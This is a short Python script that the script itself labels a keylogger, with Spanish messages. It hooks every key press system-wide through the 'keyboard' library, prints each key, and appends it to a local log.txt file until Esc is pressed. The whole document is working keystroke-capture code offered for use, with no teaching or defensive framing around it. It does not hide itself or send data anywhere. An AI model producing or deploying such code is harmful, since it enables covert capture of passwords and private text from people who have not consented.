import keyboard

def on_key(event):
    if event.event_type == keyboard.KEY_DOWN:
        key = event.name.upper() if len(event.name) > 1 else event.name
        print(f"Tecla: {key}")
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(f"{key}\n")

print("Keylogger iniciado. Presiona 'Esc' para detener.")
keyboard.hook(on_key)
keyboard.wait('esc')
print("Keylogger detenido.")
